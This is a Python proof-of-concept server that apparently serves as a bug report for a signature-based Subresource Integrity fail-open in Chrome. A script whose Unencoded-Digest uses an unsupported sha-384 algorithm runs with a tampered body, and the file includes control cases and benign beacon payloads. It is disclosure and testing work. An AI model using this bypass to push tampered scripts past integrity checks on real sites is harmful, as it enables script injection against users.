#!/usr/bin/env python3
"""
POC server: Signature-based SRI fail-open when Unencoded-Digest uses an
unrecognized algorithm.

All Ed25519 material below is precomputed (RFC 8032 test vector #1 private key)
so this server has no third-party dependencies.

Endpoints
---------
  /                  index page that loads three <script integrity="ed25519-...">
  /bug.js            BUG  : Unencoded-Digest: sha-384=<garbage>  + valid sig
  /control-block.js  CTRL : Unencoded-Digest: sha-256=<garbage>  + valid sig
  /control-pass.js   CTRL : Unencoded-Digest: sha-256=<correct>  + valid sig
  /report            beacon endpoint hit by any script that actually executes

The body served for /bug.js and /control-block.js does NOT match the asserted
digest -- it simulates a MITM that replays the (legitimately signed) headers
with a tampered body.
"""

import http.server
import socketserver
import sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080

# ---------------------------------------------------------------------------
# Ed25519 public key (base64). Embed in <script integrity="ed25519-...">.
# ---------------------------------------------------------------------------
PUBLIC_KEY_B64 = "11qYAYKxCrfVS/7TyWQHOg7hcvPapiMlrwIaaPcHURo="

# `Signature-Input` value (identical for every case; only the signed
# `Unencoded-Digest` value differs).
SIG_INPUT = (
    'sig=("unencoded-digest";sf);'
    'keyid="11qYAYKxCrfVS/7TyWQHOg7hcvPapiMlrwIaaPcHURo=";'
    'tag="ed25519-integrity"'
)

# ---------------------------------------------------------------------------
# Per-endpoint signed headers.
#
# The Ed25519 signature in each case is valid over the RFC 9421 signature base:
#
#   "unencoded-digest";sf: <digest header value>
#   "@signature-params": ("unencoded-digest";sf);keyid="...";tag="ed25519-integrity"
#
# i.e. the signature only authenticates the *header*, not the body. Body
# integrity is supposed to come from the Unencoded-Digest check.
# ---------------------------------------------------------------------------

# CASE A -- THE BUG
# `sha-384` is a well-formed structured-field dictionary entry (so the
# signature base is constructed and Ed25519 verification PASSES), but Chrome's
# Unencoded-Digest parser only whitelists sha-256/sha-512, so the digest list
# ends up EMPTY and CheckUnencodedDigests() trivially returns true.
# The 48-byte digest below is garbage; it does not match the body.
DIGEST_BUG = "sha-384=:QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB:"
SIG_BUG    = "sig=:lK7iRTLt/q5lmH2Zp6VZTCn3bi56UG2TrjbJV5WvScyu3rwbFA0W0ZCuurz/ORZTz48P5KkNkbG/znvXrV2tCQ==:"

# CASE B -- CONTROL (supported algorithm, wrong digest -> must be BLOCKED)
DIGEST_CTRL_BLOCK = "sha-256=:QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkI=:"
SIG_CTRL_BLOCK    = "sig=:YrRqr42TWILafhXXbtjINitLXnndugB6tMsymJxv4M6R7BvfCO34G+7uEYm9Wfh6lnoTYN5/fdaHdqR2gvPgCQ==:"

# CASE C -- CONTROL (supported algorithm, correct digest -> must EXECUTE)
DIGEST_CTRL_PASS = "sha-256=:mlu+dYgXGUN19TTeg6xG18f7dShb/XYgDQKvUPxjBXk=:"
SIG_CTRL_PASS    = "sig=:gFOaBQHNtqRTQdn1fHH/HL7T6zbRc7DN0pkndd4Cpi/19+zpkPk0CjTgjIKGQ0Uk1eUAglL96nSsG8/j8p+hDg==:"

# ---------------------------------------------------------------------------
# The "tampered" body. Its SHA-384 is NOT the value in DIGEST_BUG and its
# SHA-256 is NOT the value in DIGEST_CTRL_BLOCK. (It IS the value in
# DIGEST_CTRL_PASS, by construction.)
# ---------------------------------------------------------------------------
def body_for(tag: str) -> bytes:
    if tag == "control-pass":
        # Must byte-exactly match the body whose SHA-256 was signed.
        return (b"console.log('SRI-FAIL-OPEN: tampered body executed'); "
                b"document.title='SRI-FAIL-OPEN-EXECUTED';\n")
    return (
        f"console.log('[{tag}] EXECUTED -- body did not match digest');\n"
        f"fetch('/report?case={tag}');\n"
        f"var d=document.getElementById('r-{tag}');"
        f"if(d){{d.textContent='EXECUTED';d.className='exec';}}\n"
    ).encode()


INDEX = f"""<!doctype html>
<html><head><meta charset="utf-8">
<title>Signature-based SRI fail-open POC</title>
<style>
 body {{ font-family: monospace; }}
 .exec  {{ background:#c33; color:#fff; padding:2px 6px; }}
 .block {{ background:#3a3; color:#fff; padding:2px 6px; }}
 td {{ padding:4px 10px; }}
</style></head>
<body>
<h2>Signature-based SRI: <code>Unencoded-Digest</code> fail-open</h2>
<p>All three scripts below use
<code>integrity="ed25519-{PUBLIC_KEY_B64}"</code>.<br>
Each response carries a valid Ed25519 signature over its
<code>Unencoded-Digest</code> header. For <b>bug</b> and
<b>control-block</b> the served body does <b>not</b> match the digest
(simulating a MITM that replays signed headers with a tampered body).</p>

<table border="1">
<tr><th>case</th><th>Unencoded-Digest</th><th>body matches?</th>
    <th>expected</th><th>result</th></tr>

<tr><td><b>bug</b> (sha-384, unsupported)</td>
    <td><code>sha-384=:QUFB...:</code></td><td>no</td>
    <td>BLOCKED</td><td id="r-bug" class="block">blocked</td></tr>

<tr><td>control-block (sha-256, wrong)</td>
    <td><code>sha-256=:QkJC...:</code></td><td>no</td>
    <td>BLOCKED</td><td id="r-control-block" class="block">blocked</td></tr>

<tr><td>control-pass (sha-256, correct)</td>
    <td><code>sha-256=:mlu+...:</code></td><td>yes</td>
    <td>EXECUTED</td><td id="r-control-pass" class="block">blocked</td></tr>
</table>

<p><b>Bug is present</b> if the first row reads
<span class="exec">EXECUTED</span> while the second row stays
<span class="block">blocked</span>.</p>

<script src="/bug.js"
        integrity="ed25519-{PUBLIC_KEY_B64}"
        crossorigin="anonymous"></script>
<script src="/control-block.js"
        integrity="ed25519-{PUBLIC_KEY_B64}"
        crossorigin="anonymous"></script>
<script src="/control-pass.js"
        integrity="ed25519-{PUBLIC_KEY_B64}"
        crossorigin="anonymous"
        onload="var d=document.getElementById('r-control-pass');d.textContent='EXECUTED';d.className='exec';"></script>
</body></html>
"""


class Handler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _script(self, digest, sig, tag):
        body = body_for(tag)
        self.send_response(200)
        self.send_header("Content-Type", "application/javascript")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-store")
        self.send_header("Unencoded-Digest", digest)
        self.send_header("Signature-Input", SIG_INPUT)
        self.send_header("Signature", sig)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        try:
            self.wfile.write(body)
        except BrokenPipeError:
            # Chrome may abort the connection after deciding to block the
            # response in the network service; ignore.
            pass

    def do_GET(self):
        if self.path == "/" or self.path == "/index.html":
            body = INDEX.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Cache-Control", "no-store")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        elif self.path == "/bug.js":
            self._script(DIGEST_BUG, SIG_BUG, "bug")
        elif self.path == "/control-block.js":
            self._script(DIGEST_CTRL_BLOCK, SIG_CTRL_BLOCK, "control-block")
        elif self.path == "/control-pass.js":
            self._script(DIGEST_CTRL_PASS, SIG_CTRL_PASS, "control-pass")
        elif self.path.startswith("/report"):
            sys.stderr.write(f"**** SCRIPT EXECUTED: {self.path} ****\n")
            self.send_response(204)
            self.send_header("Content-Length", "0")
            self.end_headers()
        else:
            self.send_error(404)

    def log_message(self, fmt, *args):
        sys.stderr.write("[server] " + (fmt % args) + "\n")


class ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    allow_reuse_address = True
    daemon_threads = True


if __name__ == "__main__":
    with ThreadingHTTPServer(("127.0.0.1", PORT), Handler) as httpd:
        sys.stderr.write(f"[server] listening on http://127.0.0.1:{PORT}/\n")
        httpd.serve_forever()
